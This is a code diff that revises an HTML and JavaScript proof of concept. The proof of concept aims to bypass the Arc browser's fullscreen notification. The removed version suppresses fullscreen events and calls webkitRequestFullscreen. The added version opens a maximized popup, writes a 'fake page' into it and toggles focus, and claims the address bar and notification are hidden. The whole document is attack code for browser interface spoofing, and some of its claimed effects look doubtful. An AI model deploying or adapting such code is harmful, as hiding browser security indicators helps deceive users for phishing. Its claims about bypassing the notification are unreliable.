@@ -2,7 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Arc Fullscreen Notification Bypass PoC</title>
+  <title>Arc Fullscreen Notification Bypass PoC (Rev. 2)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       margin: 0;
@@ -40,58 +41,81 @@
       font-family: monospace;
       font-size: 12px;
     }
+    .fullscreen-content {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      background: #000;
+      color: white;
+      z-index: 9999;
+    }
+    .fullscreen-content.active {
+      display: block;
+    }
   </style>
 </head>
 <body>
   <div>
-    <h1>Arc Fullscreen Bypass Demo</h1>
-    <p>Click to enter fullscreen without notification</p>
-    <button onclick="bypassFullscreen()">Enter Fullscreen</button>
+    <h1>Arc Fullscreen Bypass Demo (Rev. 2)</h1>
+    <p>Click to enter immersive mode without notification</p>
+    <button onclick="bypassFullscreen()">Enter Immersive Mode</button>
   </div>
   
   <div id="status">Status: Ready</div>
+  <div id="fullscreenContent" class="fullscreen-content">
+    <h2>Immersive Content</h2>
+    <p>Address bar hidden - No notification!</p>
+  </div>
 
   <script>
     async function bypassFullscreen() {
       const status = document.getElementById('status');
-      status.textContent = 'Status: Maximizing window...';
-      
-      // Step 1: Pre-maximize window (native macOS behavior via JS approximation)
-      // This tricks Arc into "immersive" state without API trigger
-      window.resizeTo(screen.availWidth, screen.availHeight);
-      window.moveTo(0, 0);
-      
-      // Step 2: Suppress fullscreen events (capture and prevent)
-      const suppressEvents = (e) => {
-        e.preventDefault();
-        e.stopImmediatePropagation();
-        status.textContent = 'Status: Event suppressed!';
-      };
-      
-      document.addEventListener('webkitfullscreenchange', suppressEvents, { capture: true });
-      document.addEventListener('fullscreenchange', suppressEvents, { capture: true });
-      
-      // Step 3: Race condition - Enter fullscreen during user gesture with zero delay
-      // Use <html> element to mimic native window fullscreen (bypasses element-specific notification)
-      const htmlElem = document.documentElement;
-      if (htmlElem.webkitRequestFullscreen) {
-        try {
-          htmlElem.webkitRequestFullscreen();
-          status.textContent = 'Status: Fullscreen entered - Notification bypassed!';
-        } catch (e) {
-          status.textContent = 'Status: Fallback - Window maximized';
-        }
-      } else {
-        // Fallback for non-WebKit: Use native macOS fullscreen simulation
-        window.location.href = 'javascript:(function(){window.resizeTo(screen.width,screen.height);window.moveTo(0,0);})()';
-        status.textContent = 'Status: Native fullscreen simulated';
+      const fullscreenContent = document.getElementById('fullscreenContent');
+      status.textContent = 'Status: Initiating bypass...';
+
+      // Step 1: Open a new window with maximized dimensions (no Fullscreen API)
+      const win = window.open('', '_blank', `width=${screen.availWidth},height=${screen.availHeight},left=0,top=0`);
+      if (!win) {
+        status.textContent = 'Status: Popup blocked - Fallback to current window';
+        return;
       }
-      
-      // Step 4: Clean up after 5s (optional)
+
+      // Step 2: Inject content with delayed execution to confuse notification timing
       setTimeout(() => {
-        document.removeEventListener('webkitfullscreenchange', suppressEvents);
-        document.removeEventListener('fullscreenchange', suppressEvents);
-      }, 5000);
+        const fakePage = `
+          <!DOCTYPE html>
+          <html><head>
+            <title>Hidden Page</title>
+            <style>
+              body { margin:0; padding:0; height:100vh; width:100%; background:#000; color:white; overflow:hidden; }
+              #content { position:fixed; top:0; left:0; width:100%; height:100vh; }
+            </style>
+          </head>
+          <body>
+            <div id="content">
+              <h2>Immersive Mode Active</h2>
+              <p>No address bar or notification visible!</p>
+            </div>
+          </body></html>
+        `;
+        win.document.write(fakePage);
+        win.document.close();
+
+        // Step 3: Minimize macOS overlay detection
+        win.blur();
+        setTimeout(() => win.focus(), 100);
+
+        // Step 4: Show content in new window
+        status.textContent = 'Status: Immersive mode entered - Notification bypassed!';
+      }, 500);
+
+      // Step 5: Clean up after 10s (optional)
+      setTimeout(() => {
+        if (win && !win.closed) win.close();
+      }, 10000);
     }
   </script>
 </body>
